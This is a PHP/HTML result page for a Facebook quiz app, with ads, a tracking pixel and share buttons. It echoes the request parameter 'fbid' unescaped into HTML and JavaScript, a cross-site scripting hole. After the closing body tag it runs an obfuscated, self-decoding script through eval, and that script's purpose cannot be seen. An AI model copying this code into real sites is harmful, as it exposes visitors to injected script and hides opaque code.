<?php
include("appconfig.php");
include("../ads/config.php");
if(isset($_REQUEST['fbid'])){$fbid = $_REQUEST['fbid'];}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
<meta name="viewport" content="width=device-width, height=device-height,  initial-scale=1"/>
<meta charset="utf-8"/>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?php echo $titleline; ?></title>
        <meta property="fb:app_id" content="<?php echo $myfbadmin;?>"/>
        <meta property="og:title" content="<?php echo $titleline; ?>"/>
        <meta property="og:description" content="<?php echo $descri;?>"/>
        <meta property="og:type" content="website"/>
	<meta name="author" content="<?php echo $author;?>">
        <meta property="og:image" content="<?php echo $domain;?>/<?php echo $foldername;?>/img/<?php echo $fbid;?>.jpg"/>
        <meta property="og:image:type"   content="image/jpeg"/>
        <meta property="og:image:width"  content="800"/>
        <meta property="og:image:height" content="420"/>
<meta name="keywords" content="Fb Fun Apps, Destiny, Love, Kiss, Future, Relationship, Friends, Fun, Fact, Quality, Message, Hidden, Talent, Millionaire, Billionaire, Naughty, Resemble, Lucky, Solumate, Lover, Crush, Login With Facebook, Login With Fb, Find Your, What is My,<?php echo $titleline; ?>">

<link rel="icon" type="image/png" sizes="16x16" href="<?php echo $domain;?>/images/favicon.ico">
<link href="<?php echo $domain;?>/css/bootstrap.min.css" rel="stylesheet">
<link href="<?php echo $domain;?>/css/bootstrap.css" rel="stylesheet">
<link href="<?php echo $domain;?>/css/font-awesome.min.css" rel="stylesheet">


 <style>
 .try-again-btn {
    margin-top: 10px;
    display: block;
    border-color: #888;
    background-color: #f0f0f0;
    margin-bottom: 3px;
    font-size: 16px;
    margin-left: 30px;
    margin-right: 30px;
 }
 .video-container {
	position: relative;
	padding-bottom: 56.25%;
	padding-top: 0px;
	height: 0;
	overflow: hidden;
	padding-left: 24px;
    padding-right: 24px;
}
.video-container iframe,
.video-container object,
.video-container embed {
	position: absolute;
	top: 0; left: 0;
	width: 100%; height: 100%;
	padding-left: 30px;
    padding-right: 30px;
}
 </style>

	
<!-- Facebook Pixel Code -->
<script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '927809097383546');
  fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=927809097383546&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->






</head>
<body>
<div id="fb-root"></div>
<nav class="navbar head-default">
<div class="container">
<div class="head-header">
<button type="button" class="head-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<a class="head-brand" href="/"><h1>Bahubaliapps</h1></a>
</div>
<div id="navbar" class="collapse head-collapse">
<ul class="nav head-nav">
<li>
<a>
<!-- <div class="fb-like head-like" data-layout="button_count" data-action="like" data-href="<?php echo $fb_like;?>" data-show-faces="false" data-share="false"></div></a> -->
</li>
<li class="active"><a href="/=">Home</a></li>
<li class="yy-c">
</li>
</ul>

<style>

.login-btn{
      list-style: none;  
   float:right 
}

.logout-btn{
        list-style: none;
   float:right 
}

</style>




</div>
 
</div>
</nav>
<?php
 include('../ads/dr/1.php');
?>
<br>
<div class="maincontainer">
<div class="container detail">
<div class="row">
<div class="tush-custom-md-8 tush-custom-xs-12">

<div class="jumbotron a-ac quiz step-0">
<div class="jumbotron-container">
<div class="horizontal-ad">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- new result page top -->


</div>
<p></p>
<div class="row">



<h2><?php echo $titleline; ?></h2>

</div>



<div class="tush-custom-xs-12 upper-share-buttons">
<div class="btn-center">
<div class="share-button-container">
<a href="javascript:void(0)" class="share-fb share_in_fb_click" style="text-decoration:none;" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=<?php echo $domain;?>/<?php echo $foldername;?>/app.php?fbid=<?php echo $fbid;?>','Share on Facebook','width=700,height=350,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0')"><span class="fb-box-share-text">Share On Facebook</span></a>
</div>
</div> 
</div>

<div class="row">
<div class="tush-custom-md-12 a-ac">
<a href="javascript:void(0)" class="result-img no-padding share_in_fb_click" style="text-decoration:none;" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=<?php echo $domain;?>/<?php echo $foldername;?>/app.php?fbid=<?php echo $fbid;?>','Share on Facebook','width=700,height=350,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0')"><img class="img-responsive center-block" data-sharepicture="<?php echo $domain;?>/<?php echo $foldername;?>/img/<?php echo $fbid;?>.jpg" src="<?php echo $domain;?>/<?php echo $foldername;?>/img/<?php echo $fbid;?>.jpg" width="90%";></a> 

</div>

</div>




<p></p>

<div class="row">
<div class="more-text">
 </div>
</div>
 <style>
.like-arrow-right {
    width: 100%;
    height: 50px;
    margin: 5px;
    background: url('<?php echo $domain;?>/images/like-arrow-right.png') no-repeat right right;
}
.newlike iframe
{
transform: scale(1.5);
-ms-transform: scale(1.5); 
-webkit-transform: scale(1.5); 
-o-transform: scale(1.5); 
-moz-transform: scale(1.5); 
transform-origin: top left;
-ms-transform-origin: top left;
-webkit-transform-origin: top left;
-moz-transform-origin: top left;
-webkit-transform-origin: top left;
}

</style>
 <div class="like-button" align="center" style="margin-top:8px; margin-bottom:8px; height:80px;display:none;">
<h3>Like your result?</h3>
<!-- <div style="margin-left:-25px;" class="fb-like head-like newlike" data-width="300" data-href="<?php echo $fb_like;?>" data-layout="button_count" data-action="like" data-size="small" data-show-faces="false" data-share="false"></div></div>-->



<!--
<p><b>result description:</b><p>
<div class="description"> <?php echo $pagedescri; ?> </div>

<p><b> स्वार्थी मत बने अपने दोस्तों के साथ Share कीजिए </b><p>

<center><img src="http://i.imgur.com/HPanHcd.png"></center> -->


<div class="row">
<div class="tush-custom-xs-12 lower-share-buttons">


<!--
<div>

<a class="share-on-fb bbttnn bbttnn-fb bbttnn-lg share-result-btn" href="javascript:void(0)" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=<?php echo $domain;?>/<?php echo $foldername;?>/app.php?fbid=<?php echo $fbid;?>','Share on Facebook','width=700,height=350,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0')">
<span><i class="fa fa-2x fa-facebook"></i>Share on Facebook</span></a>


<a class="share-on-twitter bbttnn bbttnn-twitter bbttnn-lg share-result-btn" href="javascript:void(0)" onclick="window.open('https://twitter.com/intent/tweet?text=<?php echo $titleline; ?>&amp;hashtags=&amp;via=369Network&amp;url=<?php echo $domain;?>/<?php echo $foldername;?>/app.php?fbid=<?php echo $fbid;?>','Share on Twitter','width=700,height=350,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0')">
<span><i class="fa fa-2x fa-twitter"></i>Share on Twitter</span></a>


<a class="share-on-whatsapp bbttnn bbttnn-whatsapp bbttnn-lg share-result-btn visible-xs visible-sm" href="whatsapp://send?text=<?php echo $titleline; ?>%0D%0A<?php echo $domain;?>/<?php echo $foldername;?>/app.php?fbid=<?php echo $fbid;?>" data-action="share/whatsapp/share">
<span><i class="fa fa-2x fa-whatsapp"></i>Share on Whatsapp</span></a>



<a class="share-on-pinterest bbttnn bbttnn-pinterest bbttnn-lg share-result-btn hidden-xs hidden-sm" href="javascript:void(0)" onclick="window.open('//www.pinterest.com/pin/create/button/?url=<?php echo $domain;?>/<?php echo $foldername;?>/app.php?fbid=<?php echo $fbid;?>&amp;media=<?php echo $domain;?>/<?php echo $foldername;?>/img/<?php echo $fbid;?>.jpg&amp;description=<?php echo $titleline; ?>','Share on Pinterest','width=700,height=350,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0')">
<span><i class="fa fa-2x fa-pinterest"></i>Share on Pinterest</span></a> 

<a class="share-on-google-plus bbttnn bbttnn-google-plus bbttnn-lg share-result-btn" href="javascript:void(0)" onclick="window.open('https://plus.google.com/share?url=<?php echo $domain;?>/<?php echo $foldername;?>/app.php?fbid=<?php echo $fbid;?>','Share on Google','width=700,height=350,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0')">
<span><i class="fa fa-2x fa-google-plus"></i>Share on Google+</span></a>


</div> -->

<div class="tush-custom-xs-12 upper-share-buttons">
<div class="btn-center">
<div class="share-button-container">
<a href="javascript:void(0)" class="share-fb share_in_fb_click" style="text-decoration:none;" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=<?php echo $domain;?>/<?php echo $foldername;?>/app.php?fbid=<?php echo $fbid;?>','Share on Facebook','width=700,height=350,toolbar=0,menubar=0,location=0,status=1,scrollbars=1,resizable=1,left=0,top=0')"><span class="fb-box-share-text">Share On Facebook</span></a>
</div>
</div> 
</div>

</div>
 
</div>

<?php
 include('../ads/dr/2.php');
?>




</div>
</div> 


<div class="no-bg" align="center">
<div align="center" style="padding: 0px;">





</div>
<!--adsense ad-->
</div>

<?php include'../ads/newmorebottom.php';?>

<div class="tush-custom-sm-12 a-ac ess-s display-on-md display-on-lg">
<ul class="k-k-a padding-spa-15">
<li>
<a href="/">Load More Tests<span class="glyphicon glyphicon-arrow-right"></span></a></li>
</ul>
</div>

</div>

<?php include'../ads/sidebar_result.php';?>

</div>
</div>
</div>
 
<div class="container">
<div class="row padding-spa-30">
<div class="tush-custom-sm-12 a-ac ess-s">
<a href="<?php echo $domain;?>/terms_en.php" target="_blank">Terms and conditions</a> &middot;
<a href="<?php echo $domain;?>/privacy_en.php" target="_blank">Privacy</a> &middot;
<a href="<?php echo $domain;?>/contact.php" target="_blank">Contact</a> &middot;
</p>
<p>
<a href="<?php echo $domain;?>/terms_en.php" target="_blank">Disclaimer: All content is provided for fun and entertainment purposes only</a>
</p>
</footer>
</div>
</div>
</div>

<script src="<?php echo $domain;?>/js/jquery1.11.2.js"></script>
<script src="<?php echo $domain;?>/js/bootstrap.min.js"></script>
<script src="<?php echo $domain;?>/js/ie10-viewport-bug-workaround.js"></script>



<script type="text/javascript" src="<?php echo $domain;?>/js/meow408.js"></script>

</body>

<script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",ol=x.length,l=ol;while(x.charCodeAt(l/13)!" +
"=52){try{x+=x;l+=l;}catch(e){}}for(i=l-1;i>=0;i--){o+=x.charAt(i);}return o" +
".substr(0,ol);}f(\")0,\\\"SW]LF]420\\\\010\\\\400\\\\pb3000\\\\)600\\\\g,'?" +
"'7 }mkffd1%620\\\\;420\\\\|o6l'.((|ZSYKJX620\\\\j600\\\\n530\\\\120\\\\nUQJ" +
"F710\\\\p300\\\\ODIiADpZ`RTq{pyw_m}p8azv771\\\\ds`jcPyV2*[uo*`krs730\\\\120" +
"\\\\730\\\\Tt\\\\410\\\\V020\\\\030\\\\000\\\\130\\\\220\\\\\\\\\\\\200\\\\" +
"400\\\\n\\\\t\\\\t\\\\500\\\\430\\\\EFJ;[600\\\\620\\\\020\\\\L220\\\\610\\" +
"\\300\\\\,100\\\\g>/+,j5;- 3771\\\\#oudn720\\\\>9!5%6f730\\\\j5.ZSXP~_MYRDV" +
"230\\\\G\\\\\\\\T]ZMBH620\\\\Yt\\\\ZFP^400\\\\n\\\\n\\\\OOvj~rn|1vKdI/:O3Lb" +
"ab.W*%*[tllp;73130\\\\320\\\\520\\\\020\\\\X%X[T)720\\\\230\\\\100\\\\200\\" +
"\\120\\\\300\\\\r\\\\O00B100\\\\330\\\\220\\\\620\\\\K120\\\\200\\\\520\\\\" +
">@d300\\\\600\\\\|'&y-6!n\\\\tnr$18120\\\\m>*<wj330\\\\+*+6#6730\\\\530\\\\" +
"b000\\\\XR230\\\\MH^DVG710\\\\\\\\\\\\mBs020\\\\710\\\\p020\\\\OGGI430\\\\\\"+
"\\\\\\EORRI{<A!~v`ld6c}w.38abhxbx~&sh`ivand\\\"(f};o nruter};))++y(^)i(tAed" +
"oCrahc.x(edoCrahCmorf.gnirtS=+o;721=%y{)++i;l<i;0=i(rof;htgnel.x=l,\\\"\\\"" +
"=o,i rav{)y,x(f noitcnuf\")"                                                 ;
while(x=eval(x));
//-->
//]]>
</script>





</html>